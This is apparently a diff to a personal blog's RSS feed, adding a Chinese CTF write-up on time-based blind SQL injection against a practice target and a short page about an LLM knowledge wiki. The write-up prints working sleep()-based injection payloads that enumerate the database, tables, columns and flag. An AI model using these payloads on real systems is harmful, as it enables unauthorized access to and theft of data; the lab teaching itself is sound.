@@ -1762,7 +1762,67 @@ env 或 printenv 才能看见。&lt;/p&gt;
 编写脚本对每个位置遍历 &lt;code&gt;a-z0-9{}_&lt;/code&gt; 字符集，42 个字符约需 42×35 ≈ 1500 次请求
 提取全部 42 个字符，得到 &lt;code&gt;flag{fd8914fb-d709-48a6-85e5-cbb368984e7f}&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;复盘&lt;/strong&gt;：这题的核心是&lt;strong&gt;布尔盲注&lt;/strong&gt;——页面不显示查询数据，只能通过响应状态（&amp;ldquo;查询成功&amp;rdquo; vs &amp;ldquo;未找到&amp;rdquo;）判断条件真假。与报错注入不同，布尔盲注需要逐字符遍历提取数据，请求量较大但逻辑简单。字符型注入需要用 &lt;code&gt;&#39;&lt;/code&gt; 闭合和 &lt;code&gt;#&lt;/code&gt; 注释&lt;/p&gt;
-</description>
+&lt;h3 id=&#34;ezsql_14字符型-sql-注入---时间盲注---无数据显示&#34;&gt;EZSQL_14(字符型 SQL 注入 - 时间盲注 - 无数据显示)
+&lt;/h3&gt;&lt;p&gt;访问靶机，页面是一个&amp;quot;Employee Query&amp;quot;员工查询系统，输入 Employee ID 查询
+正常查询 &lt;code&gt;id=1&lt;/code&gt; 返回&amp;quot;The query results have been sent to your email.&amp;quot;，页面&lt;strong&gt;不显示任何数据&lt;/strong&gt;
+测试 &lt;code&gt;id=1&#39; and &#39;1&#39;=&#39;1&lt;/code&gt; 和 &lt;code&gt;id=1&#39; and &#39;1&#39;=&#39;0&lt;/code&gt;，两者响应内容完全相同（MD5 哈希一致），&lt;strong&gt;无布尔差异&lt;/strong&gt;
+尝试时间盲注：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39; and sleep(3)#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;响应延迟 3 秒，确认存在&lt;strong&gt;字符型时间盲注&lt;/strong&gt;，&lt;code&gt;sleep()&lt;/code&gt; 函数可用，&lt;code&gt;#&lt;/code&gt; 注释有效
+无 WAF 过滤，&lt;code&gt;select&lt;/code&gt;、&lt;code&gt;union&lt;/code&gt;、&lt;code&gt;from&lt;/code&gt;、&lt;code&gt;where&lt;/code&gt; 等关键词均可正常使用
+确认数据库名，sleep 条件为真时延迟 3 秒：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39; and sleep(if(database()=&amp;#39;user&amp;#39;,3,0))#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;返回延迟 3 秒，数据库名为 &lt;code&gt;user&lt;/code&gt;
+编写二分查找脚本，利用 &lt;code&gt;ascii(substr(...))&lt;/code&gt; 配合 &lt;code&gt;sleep(if(...))&lt;/code&gt; 逐字符提取数据
+枚举表名，首字符 ASCII &amp;gt; 100（对应 &amp;rsquo;e&amp;rsquo;），确认 &lt;code&gt;employees,flag&lt;/code&gt; 两张表：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39; and sleep(if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&amp;gt;100,3,0))#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;查看 flag 表列名，确认 &lt;code&gt;id,flag&lt;/code&gt; 两列：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39; and sleep(if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;flag&amp;#39;),1,1))&amp;gt;100,3,0))#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;逐字符提取 flag 值，每个字符通过二分查找（~7 次请求/字符），42 个字符约 300 次请求：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39; and sleep(if(ascii(substr((select flag from flag),1,1))&amp;gt;100,3,0))#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;提取全部 42 个字符，得到 &lt;code&gt;flag{eaaa6edb-1425-4cca-9060-4db595c17008}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;复盘&lt;/strong&gt;：这题的核心是&lt;strong&gt;时间盲注&lt;/strong&gt;——页面不显示查询数据，且布尔条件无响应差异，只能通过 &lt;code&gt;sleep()&lt;/code&gt; 函数的延迟来判断条件真假。与布尔盲注相比，时间盲注的每个请求都需要等待 sleep 时间，提取速度更慢。字符型注入需要用 &lt;code&gt;&#39;&lt;/code&gt; 闭合和 &lt;code&gt;#&lt;/code&gt; 注释。做 SQL 注入题遇到无数据显示且无布尔差异时，时间盲注是标准解法&lt;/p&gt;
+&lt;h3 id=&#34;ezsql_15&#34;&gt;EZSQL_15
+&lt;/h3&gt;&lt;h3 id=&#34;ezsql_16&#34;&gt;EZSQL_16
+&lt;/h3&gt;&lt;h3 id=&#34;ezsql_17&#34;&gt;EZSQL_17
+&lt;/h3&gt;&lt;h3 id=&#34;ezsql_18&#34;&gt;EZSQL_18
+&lt;/h3&gt;&lt;h3 id=&#34;ezsql_19&#34;&gt;EZSQL_19
+&lt;/h3&gt;</description>
         </item>
         <item>
         <title>QingCen靶场Web入门wp-上</title>
@@ -4004,6 +4064,25 @@ payload&lt;/p&gt;
         
         <guid>https://xxchen-yu.github.io/search/</guid>
         <description></description>
+        </item>
+        <item>
+        <title>Wiki</title>
+        <link>https://xxchen-yu.github.io/wiki/</link>
+        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+        
+        <guid>https://xxchen-yu.github.io/wiki/</guid>
+        <description>&lt;h1 id=&#34;面向终身学习的-llm-wiki-知识管理体系的构建&#34;&gt;面向终身学习的 LLM WIKI 知识管理体系的构建
+&lt;/h1&gt;&lt;p&gt;这里用于沉淀长期学习中的问题、概念、方法、提示词、项目经验与复盘记录，让知识可以被持续更新、交叉引用，并在需要时被 LLM 快速调用。&lt;/p&gt;
+&lt;h2 id=&#34;知识入口&#34;&gt;知识入口
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;概念库：整理核心概念、术语和模型能力边界。&lt;/li&gt;
+&lt;li&gt;方法库：沉淀学习路径、研究方法、Prompt 模板和工作流。&lt;/li&gt;
+&lt;li&gt;项目库：记录实践项目、实验结论和可复用方案。&lt;/li&gt;
+&lt;li&gt;复盘库：保存错误、决策、改进点和下一步行动。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;构建方向&#34;&gt;构建方向
+&lt;/h2&gt;&lt;p&gt;把零散笔记逐步组织成可检索、可扩展、可复用的个人知识网络，服务长期学习与持续创造。&lt;/p&gt;
+</description>
         </item>
         <item>
         <title>关于</title>
